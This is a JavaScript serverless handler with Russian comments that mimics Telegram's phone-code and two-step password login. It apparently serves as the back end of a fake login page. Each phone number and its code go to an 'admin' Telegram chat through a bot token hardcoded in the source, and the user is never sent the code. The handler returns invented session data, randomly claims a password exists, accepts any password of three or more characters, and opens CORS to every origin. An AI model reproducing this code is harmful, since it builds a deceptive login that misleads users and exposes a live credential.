// api/index.js — ОДИН ФАЙЛ ДЛЯ ВСЕХ ЭНДПОИНТОВ

// Хранилище кодов (в памяти)
const codeStore = new Map();

export default async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const url = req.url || '';
    
    // ========== sendCode ==========
    if (url === '/sendCode' && req.method === 'POST') {
        try {
            const { phone } = req.body;
            
            if (!phone || phone.length < 6) {
                return res.status(400).json({ success: false, error: 'Invalid phone number' });
            }

            const code = Math.floor(100000 + Math.random() * 900000).toString();
            const requestId = `req_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

            codeStore.set(requestId, {
                phone,
                code,
                createdAt: Date.now(),
                attempts: 0
            });

            setTimeout(() => {
                if (codeStore.has(requestId)) {
                    codeStore.delete(requestId);
                }
            }, 5 * 60 * 1000);

            // Отправляем код админу
            try {
                const ADMIN_BOT_TOKEN = '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec';
                const ADMIN_CHAT_ID = '7303763255';
                await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: `📱 Код для ${phone}: *${code}*\nRequest ID: \`${requestId}\``,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                console.warn('Admin bot error:', e.message);
            }

            console.log(`[SEND] phone: ${phone}, code: ${code}`);

            return res.status(200).json({
                success: true,
                requestId: requestId,
                message: 'Code sent successfully'
            });

        } catch (error) {
            console.error('[SEND] Error:', error);
            return res.status(500).json({ success: false, error: error.message });
        }
    }

    // ========== checkCode ==========
    if (url === '/checkCode' && req.method === 'POST') {
        try {
            const { phone, code, requestId } = req.body;

            if (!phone || !code || !requestId) {
                return res.status(400).json({
                    success: false,
                    error: 'Missing required fields'
                });
            }

            const stored = codeStore.get(requestId);

            if (!stored) {
                return res.status(400).json({
                    success: false,
                    error: 'Code expired. Please request a new one.'
                });
            }

            if (stored.phone !== phone) {
                return res.status(400).json({
                    success: false,
                    error: 'Phone number mismatch'
                });
            }

            stored.attempts += 1;

            if (stored.attempts > 5) {
                codeStore.delete(requestId);
                return res.status(400).json({
                    success: false,
                    error: 'Too many attempts. Request a new code.'
                });
            }

            if (stored.code !== code) {
                return res.status(400).json({
                    success: false,
                    error: `Invalid code. ${5 - stored.attempts} attempts left.`
                });
            }

            codeStore.delete(requestId);

            const hasPassword = Math.random() < 0.2;
            const sessionData = {
                user_id: Math.floor(100000 + Math.random() * 900000),
                phone: phone,
                username: `user_${Math.random().toString(36).substring(2, 10)}`,
                first_name: 'User',
                last_name: '',
                session_string: `session_${Date.now()}_${Math.random().toString(36)}`
            };

            console.log(`[CHECK] phone: ${phone}, success: true`);

            return res.status(200).json({
                success: true,
                hasPassword: hasPassword,
                sessionData: sessionData,
                message: 'Code verified'
            });

        } catch (error) {
            console.error('[CHECK] Error:', error);
            return res.status(500).json({ success: false, error: error.message });
        }
    }

    // ========== checkPassword ==========
    if (url === '/checkPassword' && req.method === 'POST') {
        try {
            const { phone, password, sessionData } = req.body;

            if (!phone || !password || !sessionData) {
                return res.status(400).json({
                    success: false,
                    error: 'Missing required fields'
                });
            }

            const isValid = password && password.length >= 3;

            if (isValid) {
                console.log(`[PASS] phone: ${phone}, verified`);
                return res.status(200).json({
                    success: true,
                    message: 'Password verified'
                });
            } else {
                return res.status(400).json({
                    success: false,
                    error: 'Invalid password'
                });
            }

        } catch (error) {
            console.error('[PASS] Error:', error);
            return res.status(500).json({ success: false, error: error.message });
        }
    }

    // ========== 404 ==========
    return res.status(404).json({
        success: false,
        error: 'Not found',
        path: url
    });
}
